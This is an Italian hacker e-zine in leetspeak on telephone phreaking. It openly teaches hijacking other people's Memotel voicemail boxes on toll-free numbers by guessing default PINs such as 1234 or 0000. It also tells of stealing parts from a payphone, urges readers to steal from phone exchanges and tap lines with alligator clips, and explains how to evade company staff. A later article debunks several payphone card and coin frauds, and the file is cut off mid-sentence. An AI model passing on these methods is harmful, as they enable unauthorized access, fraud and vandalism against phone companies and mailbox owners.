Voglio salutare e ringraziare NobodY88, Harlok e Blinking che ho conosciuto
per la prima volta li allo Smau, tutti i presenti per essere venuti e tutti
quelli che sarebbero voluti venire con noi ma non hanno potuto :( Inoltre
mando un salutone a Aly, dai^uffa e Crazyk0w, gli amici di sempre. Saluto
infine wInDmILL che e' tutt'ora qua insieme a me e mi ha aiutato nella stesura
di 'sta stronzata! Thx Ci vediamo raga', alla prox.:.:.:.:.:.:.:
Un bacione enorme al mio amorino....la piccola OnyxGirl :**********PpPpPpPpPpP
!.?.!.?.!.?.!.?.!.?.!.?.!.?.!.?.!.?.!.?.!.?.!.?.!.?.!.?.!.?.!.?.!.?.!.?.!.?.!.

r4G4', |\|0|\| pR3nD3t3V3l4 tR0pP0 s3 sT0 tXt f4 c4c4r3... l'h0 sC1tT0 iN
p0Ch15S1m0 t3Mp0 3 p4r3cCh10 d0pO eS53R3 5t4t0 4Ll0 sM4U; s3 l'h0 5cR1tT0 n0N
51gNiF1c4 m1C4 cH3 aV3v0 d4 d1Rv1 qLC d4 d1rV1..n0?!?!?!?!?!?!?!?!

Non so proprio piu' che raccontarvi...lo Smau di quest'anno e' stata proprio
una bella cosa... ci siamo divertiti e siamo stati una giornata insieme...
nun vi sembra una bella cosa????
Chiedo scusa ai lettori per il contenuto scarso livello tecnico di questo
'coso' ma d'altronde ikke dovevo scrive??????

Vi saluto tutti, oh adepti...a presto
Il vostro _p0zz0_ (alias _p0nic0_) with lA coLlAboRaZione Di wInDmILL
;D cya gente

ֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿ
²°°°°°°°°°°°°°°°°°°°°°°°°°°°²
²°°²²²°°°°°°²²°°°°°°°°²²²²°°°°°°°°°°°°°°°°°°°°²
²°°°°°°°°°°°°°°°°°°°°°°°°°°°²
²°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°²
²°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°²
ֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿ

*****************************************************************************
|\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\|
**********************Phreaking, Segreterie e Cazzate varie******************
|\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\|
*****************************************************************************
DISCLAIMAH: l'autore e il co-autore non si assumono una cazzo di
responsabilit… sul cazzo di uso che potete fare di queste cazzo di infoz.
Buon proseguimento

AUTORE: mR_bIs0n
CO-AUTORE: Mr_Skull

CONSUMO: cioccolata fornita dalla Mr_Skull's & Co.
        mR_bIs0n: sciuizzero?
        Mr_Skull: si, perch‚?
        mR_bIs0n: ah, vabb‚...

CASA: dipende dal momento

TEMPO: piovoso su gran parte della puglia, con forti temporali sulla testa
      dei due...

CANE: quello di Skull (Whisky)

MUSICA: un pacco di Marilyn Manson, Supergrass, The Cardigans ecc...
        nonch‚ il cd di Giorgio Gentile e il suo Manager, SBORRAGEL

SALUTI: quel bravo ragazzo che ‚ pankrazio, la mamma, pap… e tutti gli zii,
        gli amiketti di skuola, Peppo Ficone, gli amici di #sbornia e gli
        amici di #hackernow, la prof.ssa Bolognino (quindi).

FUCKS TO: quel "simpatikokainomane" di Amicus, prof. Pietro Stano, il Timone
          (immancabile), gli omini Telecom (tipo quello della barzelletta),
          Danilo Bumba, Luigi Pecoraro, il preside Basile e tutta la nostra
          skuola e tante belle kose...

BARZELLETTA: Pierpaolo: Senta, ci pu• installare il kit ISDN???
        Omino Telekon n. P25F425: Certo, certo, comunico alla base...
        (si mette a fare strani fiski)
        Pierpaolo: si, ma a noi servirebbe una linea da 128kbps perch‚ noi
                 dovremmo spedire ai nostri clienti parecchie immagini da
                 alcune decine di megabytes...
        P25F425:  impossibile, qui non si tratta pi— di frequenza, sono i
                 digitali... (prende un foglietto di carta e una penna,
                 e fa delle onde) (il ritmo delle sue onde
                 cerebrali!ndMr_Skull) (poi inizia a scrivere: 010010110101)
        Pierpaolo: si, ma io so che accoppiando i due canali ISDN si pu•
                 arrivare a 128 kbps...
        P25F425: ma 64 sono gi… molti... ho visto io stesso come scaricavano
                 e mandavano gli ordini nelle farmacie...
                 (AHAHAH! (Risate in scatola tipo sit-com americana))
        Pierpaolo: mi dispiace ma lei non  qualificato. E poi le immagini
                 con cui io lavoro sono molto pi— grandi di quattro ordini...
        P25F425: ... ma gli ordini andavano veloci!!!
        Pierpaolo: Alessandro, andiamocene all'ufficio... Pap…, accordati tu
                 con questo scemo...


_.-^-._.-^-._.-^-._.-^-._.-^-.->Indice<-.-^-._.-^-._.-^-._.-^-._.-^-._.-^-.


1) Introduzione
2) Green phreak on a leash
3) La favoletta di MotorJovy e mR_bIs0n
4) Come si usa e abusa di una segreteria Memotel
5) Due parole sulla pericolosit… dei green
6) Come si diventa phreaker o quasi...
7) Consigli vari e forse utili
8) Saluti vari

_.-^-._.-^-._.-^-._.-^-._.-^-.->Introduzione<-.-^-._.-^-._.-^-._.-^-._.-^-.

Eccoci qua, dopo aver sorbito 30 minuti di televendite piene di asma e di
piega flash che poi vi regalano a sole 99 karte 1 pc multimediale ibm
compatibile che verr… installato solo per le prime 50 chiamate non da un
rivenditore, non da un tekniko, bens da Fiorello (con gli adesivi della
Infostrada) che parler… per ore e ore con la famosa Loredana al telefono
chiedendo cosa se ne deve fare del cd per l'abbonamento Libero (glielo dico
io cosa se ne deve fare, di quel cd... DOVREBBE FICCARSELO NEL CULO!!!!
NON VEDO CHE USO MIGLIORE POSSA FARNE UN DEVIATO MENTALE COME
LUI!!!!ndMr_Skull), siamo qui a parlarvi di kuello ke ci passa per la testa.
Ricordiamo che il programma  sottotitolato a pagina 666 del SatanVideo.
BUONA VISIONE, BWAZWAZWAZWAZWAZWAZWAREZWAZ

_.-^-._.-^-._.-^-._.-^->Green phreak on a leash<-.-^-._.-^-._.-^-._.-^-._.-

Mr_Skull: Vi siete mai kiesti perch‚ durante quest'estate chiamando
 all'167810000 vi rispondeva un mentecatto che blaterava qualcosa in
 strettissimo dialetto manduriano?? Bene, risponderemo al vostro kuesito... il
 mentekatto era il bIs0n...
mR_bIs0n: eh si, modestamente, un pomeriggio d'estate mi dedicai a provare
 vari numeri verdi dallo startak di mia cuGGina... ad un certo punto sento
 una vocina (era la mignottella telekozzz) che diceva: "Telekom Italia,
 informazione gratuita"-cambio di voce-"La chiamata sta per essere inoltrata
 su kordless fido"
Mr_Skull: come? Un cane sguinzagliato che risponde al telefono??? E si chiama
 Fido? Ma ki , quello della infostrada???
mR_bIs0n: ARGHHHH!!! Non dire quel nome, altrimenti mi viene in mente Fiorello
 che non so cosa se ne faccia dell'abbonamento ad internet... Comunque,
 aspettai per un po' dopodicch‚ senti una vocina che disse...
Mr_Skull: ...ti faccio un bocchino per soli 50 scatti!
mR_bIs0n: no, lo speravo anch'io, ma purtroppo era la vocina della Memotel
Mr_Skull: chi  Memotel?
mR_bIs0n: una mia amica....
Mr_Skull:  bbona?
mR_bIs0n: si, poi te la presento... ke rimba...
Mr_Skull: :;=(| (assume quest'espressione)
mR_bIs0n: comunque, reduce dalla Meridian Northern Telekom premetti subito
 # (cancelletto), o meglio dire # (diesis) e la vocina disse: "Inserire codice
 d'identificazione personale, e premere # (fate vobis)". Allora inserii 0000
 ma non and• bene...
Mr_Skull (con vocina da castrato): "Ritenta, sarai pi— fortunato"
mR_bIs0n: non proprio, ma ritentai con 1234... And• bene perch‚ il deviato
 mentale che si okkupava della segreteria
Mr_Skull: il root!
mR_bIs0n (faccia da 'Matonna'): pi— o meno... Comunque, il mentecatto in
 questione aveva lasciato il codice di default
Mr_Skull: si legge "defohlt!"
mR_bIs0n: in conclusione, seguendo i "men—" della segreteria mi impRadronii
 di quest'ultima...
Mr_Skull: io prendo un kanguro arrosto e una bottiglia di grog fatto in casa
mR_bIs0n: anch'io se paga Mr_Skull... ehm... credo che ci siano altri di
 questi numeri verdognoli che aspettano solo di essere scoperti.
 Vi consiglio di provare da i telefonini delle cugine o dalle cabine della
 villa (giardini publici) della propria citt….
Mr_Skull: MA COSA VOLETE DALLA GARELLI, LA SBORRA?

_.-^-._.-^-._.-^-._.->La favoletta di MotorJovy e mR_bIs0n<-^-._.-^-._.-^-.

C'era una volta, tanto tempo fa, ma cos tanto (ieri), un fanciulletto dal
soave nome di mR_bIs0n, con le gote rosse e i capelli d'oro che viveva da
solo con sua madre, suo padre, suo fratello e gli inquilini della porta
accanto (solo!ndMr_Skull).
Un bel d la madre gli disse:
-Cappuccetto Baison!!!
-Mamma,  scritto male!
-Ah, si scusa tesoro... senti, vai perfavore a portare questo cestino di
 Kalashmikov (si scrive cos?) alla nonnina, che la notte scorsa ha bevuto
 troppo e ora le gira la testa...
-Un minuto ma'
-Muovi immediatamente quelle fottute chiappe da quel cazzo di sedia o prendo
 la scopa
-Quella elettrica?
-Obbedisci! E stasera a letto senza cena
-Meglio (nel comodino ci• tanto di quella roba: sukki di frutta, nutella...)!
-E mi raccomando, non passare per la villa che c' il lupo cattivo e
 soprattutto ci sono le squadracce Telekom!
-Ok ma!
Ma il nostro mR_bIs0n voleva passare per la villa a sputare i vecchietti sulle
panchine. Nel mezzo del cammin di nostra vita, per•, sent un rumore
assordante... era il MotorJovy con il suo scooter supertruccato...
MJ-TS
MotorJovy TrucchescionScuter - Messa a punto parti:

        MBK-Nitro

 * Marmitta Polini "Evoluzione" con silenziatore con bordini neri indelebili
 * Carter da corsa "Top Performance" con bordini neri indelebili
 * Cinghia da corsa super-resistente con bordini neri indelebili
 * Asportazione del classico cavalletto per maggiore stabilit… e tenuta in
   curva (in realt… dava fastidio al silenziatore della marmitta)
 * Cavalletto tipo "125" con bordini neri indelebili
 * Carenatura nuova di zecca con bordini neri indelebili
 * Centralina per la regolazione della candela con bordini neri indelebili
 * Super adesivato con bordini neri indelebili
 ( tutto professionaaaaaleeeee!ndPastore)(SBONK!ndBovas)
 
-mR_bIs0n: MotorJovy! Cosa ci fai qui!?
-MotorJovy: Mah!
-mR_bIs0n: io sto andando dalla mia dolce n1onn...
-MotorJovy: guarda! Quella cabina  aperta
-mR_bIs0n: diuao! Andiamo a vedere!!!
I due si avvicinano alla cabina
-MotorJovy: smontiamola!!
-mR_bIs0n: aiutami... hai un cacciavite?
-MotorJovy: Un coltello... vabbene ugualmente? asp‚ che lo prendo...
(Traffica nelle mutande)
-MotorJovy: eccolo
-mR_bIs0n: cavolo, ‚ piccolo... ma mi accontento comunque... ne hai anche uno
 a croce???
-MotorJovy: asp‚ che vedo...
(Altro traffico)
-MotorJovy: eccolo!
-mR_bIs0n: smonta il tastierino che io penso al rotor...
-MotorJovy: a che???
-mR_bIs0n: fai, fai...
I due si mettono a praticare...
Sul display della cabina appare dapprima "FS" e poi scompare...
-Cabina: Beep beep beep beep beep
-MotorJovy: che cazzo ???
-mR_bIs0n: cavolo!!! sta segnalando manomissione alla centralina!!!
 Sbrighiamoci!!!!
Finito di smontare il rotor, il nostro eroe e il suo amico vanno verso lo
scooter
-MotorJovy: Asp‚ che metto il tastierino sotto il sellone... Dammi che metto
 il rotore... mo'... il coso!
-mR_bIs0n: Ok tieni, ma sbrigati!
-MotorJovy: Cavolo! Non entra!!!! Misterba', prendilo in mano e sali dietro
 lo scooter con me...
-mR_bIs0n: OKkazz0...
BROOOOOOOOOOOOOOUUUUUUUUUUUUUUUNUUUUUUUUOOOOOOOOOGROAHNNNNNN
I due si lanciano in una folle corsa per le strade di Manduria con il rotor
ben in vista...
Arrivano a casa di MotorJovy sani e salvi, lasciano la refurtiva nel garage.
E, come si dice in questi casi, vissero per sempre felici e contenti...

                             THE END

Casa mR_bIs0n

Telefono: Driiiiiing
mR_bIs0n's Mum: Pronto, chi parla???
mR_bIs0n's Grandmother: Angelaaaa, il Baison non mi ha portato il cestino di
Kalashmikov!!!
mR_bIs0n: nonna, non  scritto bene!
mR_bIs0n's Grandmother: ah, scusa...
Mr_Skull: vabb‚, tutto  andato per il meglio, per• ricordate:
                MADRE GODURIA  SEMPRE IN CULO A LORO!!!
mR_bIs0n: Sei sempre il migliore a sparare cavolate...

_.-^-._.-^-._.-^-.->Come si usa e abusa di una segreteria Memotel<-.-^-._.-^-.

Artikolo scritto interamente e solamente da mR_bIs0n con l'approvazione di
Mr_Skull

Memotel?

Un po'di anni fa alla telekaxx, gli venne in mente la brillante idea di
creare una segreteria "CON LA SEGRETERIA GIA' DENTRO AL TELEFONO!!!" (cos
sponsorizzavano la novit… sulle skede telefonike...).
Bene, in poke parole per averla bisogna chiederla direttamente alla telekaxx
e vi verr… attivato il servizio, infatti non  una segreteria fisica con
cassetta ect...
Se ne avete scoperta una, o su numero verde, o su di un normale numero, bene...

Cosa dobbiamo fare?

Per prima cosa, quando parte la voce registrata, voi premete "#", vi verr…
chiesto un codice ke di solito  "1234"... se non  cos, allora provate
numeri come "5555" o "9876" o roba simile... la gente  molto stupida...
quando avete finito di digitare dovete premere di nuovo "#".

E una volta entrati?

Bene se avete azzeccato il codice una voce registrata vi informer… se sono
presenti nuovi messaggi o precedentemente ascoltati... il men— vi si
presenter… in questo modo:

Tasto   Azioni e scelte varie
-1-     Per ascoltare i messaggi:
                -7- per cancellare il messaggio ascoltato
                -9- per archiviare il messaggio ascoltato
                    che verr… rimosso solo dopo 15 giorni dall'archiviazione

-2-     Per accedere al men— opzioni:
                -1- per cambiare il codice di identificazione personale
                    bisogna immettere il nuovo codice e poi ripeterlo per
                    conferma
                -2- per scegliere i messaggi di presentazione
                        -1- per i messagi pre-registrati
                        -2- per registrare il messagio di presentazione
                            che avverte che il numero chiamato  occupato
                        -3- per registrare il messagio di presentazione
                            che avverte che il proprietario del numero
                            chiamato non pu• rispondere
                        -4- per registrare il messagio di presentazione
                            che avverte che il proprietario del numero non
                             al momento raggiunguibile
                        -3- Per uscire dalla segreteria.

-*-     Per uscire da qualsiasi men— in cui vi trovate.

Cosa ci consigli di fare?

Bene, per prima cosa chiamate sempre da una cabina (io lo faccio nel 50% dei
casi,  molto pi— comodo chiamare dal salotto di casa ma molto pi—
rishioso... io amo il pericolo...), cambiate per prima cosa il codice di
identificazione (usatene uno molto difficile e cambiatelo spesso), lasciate
dei vostri messaggi registrati, magari sputtandando qualcuno (io l'ho fatto!!!
EHEHHUHUHIHIH), registrando con degli amici, oppure vantandovi di aver
fottuto la segreteria e mandando al diavolo chi chiama...

Bene, mR_bIs0n, ora non ci servi pi—, ti abbiamo solo usato... Bob (c'
sempre un Bob) fallo fuori...

EHEHE ke cavolicchio vuoi fare con una Condor (per gli eretici, pistola
giocattolo ad aria compressa con proiettili di 9mm, che di solito fanno male
ma non provocano la morte...)... UAHAHUAHAH (risata ke peggiora l'insulto)...
spara spara spara demente...

        Scar scar Can you feel my power?
        Shot here and the world gets smaller!
        Scar scar Can you feel my power?
        One shot and the world gets smaller!
        Scar scar Can you feel my power?
        Shot here and the world gets smaller!
        Shot Shot Shot MotherFucker!
        Shot Shot Shot MotherFucker!
        Shot Shot Shot MotherFucker!

        Grabbato dalla canzone "Reflective God"
        dell'album "Antichrist SuperStar"
        di Marilyn Manson (anno 1996)

mR_bIs0n                 

_.-^-._.-^-._.-^-._.->Due parole sulla pericolosit… dei green<-^-._.-^-._.-^-.

Artikolo scritto interamente e solamente da mR_bIs0n con l'approvazione di
Mr_Skull

Ci sono tante persone (parekki finti phreaker) ke si buffoneggiano dicendo:
"Uhuh... greenz, ahah ci si fa male con le proprie mani..." Ecco! Cafoni del
genere pensano ke i green siano solo i numeretti magici della CIS ke
permettono di navigare gratis... coglioni... nemmeno io userei un green
illegale... i green sono soprattutto dei numeri gratis (effettuabili anke da
cabine senza monete o skede) ke permettono di fare tante kose sfiziose a
danno della Telekaxx o ad altre societ… private... tutto ci•, se fatto da una
pubblica cabina telefonica  sicurissimo... io da un sacco di tempo provo
tanti green e non mi  successo mai nulla... Mettiamo ke la centrale telekozz
della tua citt… si accorga ke qualkuno stia facendo delle kiamate a numeri
verdi non consentiti e ke mandi una squadra di Omini TeleGum ke ti vedono
lavorare nella cabina... cosa vuoi ke facciano? Ti ammanettano? TI torturano?
Ti uccidono? Niente, non possono farti un bel niente!!! Non possono sapere
con certezza se sei tu il mascalzone, se stai facendo qualke prova sui green,
o se stai facendo una normale kiamata... e se ti prendono (cosa altamente
improbabile) puoi smentire comunque subito:

-Possibilit… 1-
Omino Telekazz: Cosa stavi facendo nella cabina???
TU: Io? Io? Io sono appena arrivato! Stavo per kiamare a mamm…!
    Ed ho aspettato ke se ne andasse l'okkupante di prima...

-Possibilit… 2-

Omino Telekazz: Cosa stavi facendo nella cabina???
TU: Ke cavolo ti interessa? Sono fatti miei!
Omino Telekazz: Tu stavi facendo dei numeri verdi non consentiti...
TU: Ah? Kosa sono? Io stavo solo scrivendo a kazzo dei numeri!
Omino Telekazz: Bene non farlo pi—!
TU: (alzando il dito medio) FOTTITI!

-Possibilit… 3-
Omino Telekazz: Cosa stavi facendo nella cabina???
TU: Niente di particolare, stavo solo utilizzando un numero verde per kiamare
    in America senza spendere un soldo... perk a te kosa interessa? Se vuoi
    te lo insegno...
(Vi sconsiglio di usare questa scusa...)

Quindi non vi preokkupate se state provando dei green... non vi cagate
addosso... io un giorno stavo controllando i messaggi di una segreteria su
green, e affianko all'altra cabina c'era un Omino ke stava riparando una
cornetta... gi… ke stavo gli ho fottuto un po'di filo telefoniko dalla
cassettina ke aveva... EHEHEHEHEHEH!!!

Cmq vi devo dire di stare alla larga di certe persone ke blaterano: "EIIII!
Andiamo alla cabina ke adesso devo kiamare in America con un numero verde..."
Al massimo pikkiatelo!

mR_bIs0n

_.-^-._.-^-._.-^-._.-^-.->Come si deventa phreaker o quasi<-.-^-._.-^-._.-^-._

Artikolo scritto interamente e solamente da mR_bIs0n con l'approvazione di
Mr_Skull

Questo art non  uno quei soliti art dei grandi hacker, ke sputtanando i
lamer, spiegando chi  un hacker... ma bens spiego come fare per essere
o diventare, non dico un phreaker (altrimenti kissa quanta critika) ma uno
ke si diverte tanto ai telefoni! Bene, in Italia se non fai brute forcing, usi
per forza green... boxare  impossibile ed anke volendo, difficile...
Bene i green sono semplici e divertenti, e almeno a me non fanno paura, e
chiunque pu• dilettarsi... bastano una cabina e un interessato che abbia
almeno un dito utilizzabile...
Io almeno ho iniziato cos, mi diverto tutt'ora e ora non mi definisco un
phreaker (sempre per la critika... e allora, cara critika, dimmelo tu ki
kazzo sono! Ah, dimmelo ki sono, un bastardo ke apre kabine, prova green e si
diverte... allora dimmelo, siccome phreaker non sono, kosa kazzo sono! *
Scusate per lo sfogo!*), e ho una buona conoscenza di ci• ke si pu• fare con i
sistemi telefonici (sbaglio o questo  phreaking?).  
Bene, io avevo appena 14 anni quando ho iniziato, ero un ragazzino curioso,
e quando uscivo la sera con gli amici provavo, cos per giocare, dei numeri
verdi tipo: 16756565 o 167454545, e pian piano scoprivo nuove cose, ne
parlavo su IRC con gli amici... ankora faccio allo stesso modo, e soprattutto
mi diverto e con me anke i miei amici (ke risate quando registravamo messaggi
di benvenuto con i miei amici ad una segreteria su green...).
Quindi, ki  davvero intenzionato a diventare phreaker non si spaventi
quando una signorina al telefono dice: "Inserire codice prego" e riattakki,
ma provasse "1234" oopure "0000" e sentire cosa risponde!

mR_bIs0n

_.-^-._.-^-._.-^-._.-^-.->Consigli vari e forse utilie<-.-^-._.-^-._.-^-._.-^-

Vorrei consigliarvi qualkosa da fare per farsi "na ccultura" nel phreaking...

Da leggere:
 - L'elenko telefoniko Telekazzarola ke ci sono tante cose interessanti da
   leggere e qui vi riporto un passo:

   Carte Telefoniche
   Scheda Telefonica Prepagata

   [...]
   La richiesta di sostituzione della scheda non utilizzata e provvista del
   talloncino di sicurezza deve essere rivoltata alla Filiale Telecom di
   competenza che fornir… anche ogni opportuna informazione relativa
   all'eventuale malfunzionamento della scheda.

   Bene, ditemi ora come KAZZO faccio a vedere se la maledetta skeda funziona
   o no se deve essere per forza provvista di talloncino... vado ad intuito
   forse...

 - Telefonia generale, un librone ke pu• essere facilmente fottuto in una
   qualsiasi centrale TeleFuck...

 - Prendersi i cataloghi G.P.E (www.gpekit.com) ke vendono dei bei kit di
   montaggio (es. Centralino telefonico, Microtrasmettitore per la
   trasmissione di conversazioni telefoniche... e tante altre cose sfiziose)

 - Qualsiasi cosa parli di telefonia e elettronica... riviste, opuscoli...

 - Urbis et Orbis, il mio libro di Latino ke konsiglio di leggere ma non
   centra comunque un cazzo...

Da fare:
 - Crearsi un gruppo di amici fidati, per lavorare insieme...  molto pi—
   divertente, almeno secondo me... (il fatto sta ke io lavoro ankora solo...)

 - Procurarsi un cellulare ke  molto utile, (non intendo dire di mandarsi
   squilli, messaggini amorosucci, con amikette e fidanzatine, cuoricini e
   fiorellini... e nemmeno per mettersi a dire in giro: "Oki Walter, comprane
   10.000 e vendi tutte quelle azioni ke sono al di sopra di..." perk  da
   dementi...) infatti e comodo per fare chiamate a green e altro...

 - Visitare le centrali Telesuck per grabbare tanta robba!!!

 - Trovarsi una ragazza (anke brutta, bha contenti voi!), ke vi consoli se vi
   hanno tolto la segreteria su green ke utilizzavi a sbafo!

 - Indire una conferenza

   Phreaking in Italia e l'ambiente CyberPunk
   Tenuta dal professore mR_bIs0n e dall'esperto Mr_Skull
   Ingresso gratuito
   Salone delle conferenze del Municipio
                                            1
 - Crearsi una radio pirata per distribuire informazioni sul phreaking

mR_bIs0n

_.-^-._.-^-._.-^-._.-^-._.-^-.->Saluti vari<-.-^-._.-^-._.-^-._.-^-._.-^-.

Questa lunga e pesante deliriata si  conclusa, se vi piace fateci sapere...
ma comunque non ce ne "futta" nulla... eheheh

Comunque sentirete parlare di noi presto con nuove riviste e guide... forse un
giorno o l'altro vedrete in prima pagina de "la Repubblica": Ragazzo 15enne
arrestato per molestie sessuali ad una ragazza 27enne... e non sar… il caso
mio (mR_bIs0n) (sto aspettando da un sacco di tempo una pedofila sui 20 anni
che mi molesti sessualmente!!!) ma se guardate pi— basso forse noterete:
Ragazzo 15enne arrestato per danni alla TeleCom Italia... 

Vabb ora un po'di saluti (solo di mR_bIs0n... Mr_Skull non ama i saluti...):

Vorrei salutare alcuni miei amici e compagni di skuola (e non solo...)

- Davide, il mio amikone (anke kiamato Panino, per via della sua rotondit…)
  con il quale trascorro il tempo sfottendo varie persone... risate
  assicurate...

- Giorgio, una vittima dei nostri insulti... un tipo assai divertente...

- Federika, forse la mia unika amika in classe... spesso parliamo del suo
  ragazzo, spesso di cazzate...

- Gabriella, una tipa a cui ho insegnato a kome usare il suo Siemens C25...

- Marco, l'uniko in klasse a soppravvivere ogni giorno senza aver fatto i
  compiti assegnati...(nonk mio kompagno di banko... eheheh uso sempre il
  suo StarTak nell'ora di Religione...)

- Peppo, anke konsciuto kome Giusy, un tipo prepotente ma divertente...

- Ilaria, una ragazza di 1רanno (io so' di 2ר!!!) co capelli rossi, ke oggi
  ha detto ke non sono il suo tipo... se ne pentir…!!!

- Elisa, una mia amika, una delle pi— belle ragazze ke io abbia mai
  conosciuto...

- Le Iene!!! Si proprio quelle di Italia Uno!!! Siete fantastici!!!

- Il minikaktus ke mia quella scoppiata di mia madre ha messo sulla case del
  PC... ma ke kaxxo mi centra???

Dedicato a (sempre e solo mR_bIs0n...):

 Daniela, l'unika ragazza della mia vita...
 EI! Non fraintendete! Non  la mia unika ragazza in senxo di fidanzata...
 Veramente non  nemmeno la mia ragazza... comunque kiss…...

mR_bIs0n & Mr_Skull

ֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿ

                        |                          |
                        | |                      | |
                        | |    MAMMA TELEKOMM    | |
                        | | DIVENTA + FURBA !:0( | |
                        | |                      | |
                        |                          |
 
Salve! Questo DOC l'ho redatto perche' voglio sinceramente fare
qualcosa per NewBies che trovo veramente fantastico.
Come tutte le cose xo' e' imperfetto e ci sono degli articoli
che non sono attendibili a livello di informazioni (purtroppo) :-(((((
Io ho sperimentato alcuni dei metodi di phreaking sulle cabine
del telefono e non fungono.
Vi spieghero'' punto per punto perche'.

1) Una seconda cosetta semplice  ricaricare le schede
telefoniche, basta soltanto spruzzare della lacca per capelli sulla striscia
magnetica e successivamente passarla su un televisore vecchio, la scheda si
ricarichera'….

-! cagata.
 xche' come dice in seguito NObodY88 il giochino cambia i dati della scheda
 ma le possibilita' che vengano incisi i dati precisi relativi a una somma
 in lira$ sulla scheda sono come quelli di vincere ad una lotteria europea :-)

Chiedo scusa a PrOzAcK le cui notizie invece sull'erikson sono corrette.

2)Queste tecniche funzionano tutte (almeno nel momento in cui scrivo):
1.Dovete prendere una scheda vuota (se piena caxxi vostri) e
piegarla in quattro
in questo modo:

|                     |  |           |
|                     |  |           |
|                     |  |   Dopo    |
|     Prima           |  |           |
|                     |                       
|                     |
|                     |
|                     |

Trovate un telefono che vada ancora a monete. Osservando il vano da dove esce
il resto si nota che le monete non escono da sopra come si potrebbe pensare
ma dal lato sinistro del vano cosi' voi prendete la vostra scheda piegata in
quattro e la in filate nel buco, (vi potete aiutare con una pinza con il
beccuccio storto); in questo modo il resto non cadra'' nel vano ma rimarra''
nello scivolo di sinistra.
                                                     
|                                                    |
|                                                    |
|                                                    |
|            |     |                                 |
|            |     |                                 |
|            |     |                                 |
|            |     |                                 |
|            |     |    |                 |          |
|            \      \   |                 |          |
|             \  |SSSSSS|                 |          |
|              \ |SSSSSS|                 |          |
|               \|SSSSSS|                 |          |
|                -------|                 |          |
| S=scheda                                           |
|                                                    |
|                                                    |
|                                                    |

Cosi dopo qualche ora passate e ritirate la mancia.

-!altro sistema che non funge +
 Il sistema funzionava nel momento in cui fusyllo scriveva ma ora, non so come
 le cabine si accorgono dell'inserimento e vanno f. s. (fuori servizio).

3)Questa tecnica dovrebbe fare in modo che la tessera entri piu'' dentro del
dovuto facendo leggere la banda magnetica ma non facendola scrivere.
Dovete inserire la scheda carica e comporre il numero, senza fretta e con
attenzione a non far accavallare le schede, inseritene due vuote una dietro
l'altra. L'importo continuare' a scendere e siccome la tessera v'erra' scritta
solo alla fine della telefonata il telefono scrivera'' su quella vuota.

-!anche sto metodo non funge + perche' i nuovi modelli multimontra rotor con
 lettore integrato e i terminali telefonici pubblici dedicati esclusivamente a
 carte scrivono durante la telefonata e non + dopo!!!

Mi sto accorgendo di tutto cio' perche' sto specializzandomi in
phreaking  di telefoni telekaxxo ma la cosa non e' per nulla semplice.
hanno ormai un livello di sicurezza nelle cabine da far paura.
se a qualcuno interessa pero' ho scoperto che il collegamento
telefonico puo'' essere stabilito veramente in modo semplice: con il cavo
(della linea) che esce dal terminale a muro e arrampicandosi per il muro
della casa a cui e' applicata va alla centralina a parete.
A sto punto basta un normale telefono con morsetti a coccodrillo da una parte
e un paio di forbici da elettricista per sbucciare il filo e il dado e' tratto.
Purtroppo ho notato il filo solo nelle cabine qui al mare sull'isola della
Maddalena da cui scrivo con un portatile.... vi faro' sapere appena tornato
in citta' se anche li' si puo'' tentare un lavoro di questo genere.
Pero' non sono sicuro di questa ipotesi perche' mi sembra di
aver letto da Dante che i segnali sono criptrati.
Ho sviluppato anche un'ipotesi e mi piacerebbe che qualcuno mi
desse dati su di questa  dicendomi se e' realizzabile o no.
Con un masterizzatore per bande magnetiche, non sarebbe possibile copiare i
dati da una scheda nuova a una usata?

ho fatto quest'articolo comunque solo per non farvi perdere tempo con metodi
inutilizzabili ma trovo che questa e-zine sia superba.
se avete da bombardarmi dopo sto articolo o da uccidermi o altro (tipo dirmi
se ho fatto bene o male a realizzarlo o volete altre info sui telekazzofoni)
scrivetemi un'email a rez31337@hotmail.com e se non mi e' scaduta l'e-mail vi
rispondero'.
buona notte 
                                                               
ReZ

ֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿ

              ֹֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽ»
              ÷ִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִ¿÷
              ÷³  E' POSSIBILE COPIARE SCHEDE MAGNETICHE? ³÷
              ÷ְִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִ÷
              ָֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽ¼

PREMESSA = scusate in anticipo x tutte le stronzate che si potranno rivelare
           essere tali in questo articolo :)

DOMANDA BY ******* = e' possibile copiare una scheda magnetica?
RISPOSTA BY N0bodY88 = e' possibile copiare una scheda magnetica ma purtroppo
                       ci sono due cose che ti romperebbero il cax:
